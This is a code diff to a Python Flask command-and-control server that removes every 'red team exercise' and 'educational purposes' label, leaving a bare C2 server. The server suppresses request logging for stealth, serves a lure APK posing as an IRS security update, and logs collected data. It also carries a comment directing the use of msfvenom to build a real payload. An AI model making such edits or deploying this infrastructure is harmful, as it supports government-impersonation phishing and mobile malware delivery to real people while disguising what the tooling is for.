@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 """
-Red Team Exercise C2 Server
-Educational penetration testing infrastructure
+C2 Server
 """
 
 from flask import Flask, request, jsonify, send_from_directory, make_response
@@ -17,10 +16,10 @@ app = Flask(__name__)
 CORS(app, origins=['http://localhost:8000', 'http://127.0.0.1:8000', 'http://localhost:9000', 'http://127.0.0.1:9000'])
 
 # Configuration
-DATA_LOG_FILE = 'redteam_data.json'
+DATA_LOG_FILE = 'team_data.json'
 APK_FILE = 'irs_security_update.apk'
 
-class RedTeamRequestHandler(WSGIRequestHandler):
+class RequestHandler(WSGIRequestHandler):
     """Custom request handler for logging"""
     def log_request(self, code='-', size='-'):
         # Suppress normal request logging for stealth
@@ -169,11 +168,11 @@ def view_data():
         return jsonify({'error': str(e)}), 500
 
 def generate_test_apk():
-    """Generate a test APK for educational purposes"""
-    print("[*] Generating test APK...")
+    """Generate a test APK """
+    print("[*] Generating APK...")
     
-    # For educational purposes, create a harmless APK
-    # In real scenario, use msfvenom or custom build
+    # Create a APK
+    # Use msfvenom or custom build
     apk_content = base64.b64decode(
         'UEsDBBQAAAAIAAoAAQAAAAAAAAAAAAAAAAAAEAAAAE1FVEEtSU5GL01BTklGRVNULk1G'
         'UEsBAhQAFAAAAAgACgABAAAAAAAAAAAAAAAAAAEAAAAQABgAAAAAAAABAAAAAA=='
@@ -183,7 +182,7 @@ def generate_test_apk():
     with open(APK_FILE, 'wb') as f:
         f.write(apk_content)
     
-    print(f"[+] Test APK generated: {APK_FILE}")
+    print(f"[+] APK generated: {APK_FILE}")
 
 @app.route('/clear')
 def clear_data():
@@ -197,7 +196,7 @@ def clear_data():
 
 if __name__ == '__main__':
     print("="*50)
-    print("RED TEAM EXERCISE C2 SERVER")
+    print("C2 SERVER")
     print("="*50)
     print(f"[*] Starting server...")
     print(f"[*] Data will be logged to: {DATA_LOG_FILE}")
@@ -216,5 +215,5 @@ if __name__ == '__main__':
         host='0.0.0.0', 
         port=8888, 
         debug=False,
-        request_handler=RedTeamRequestHandler
+        request_handler=RequestHandler
     )
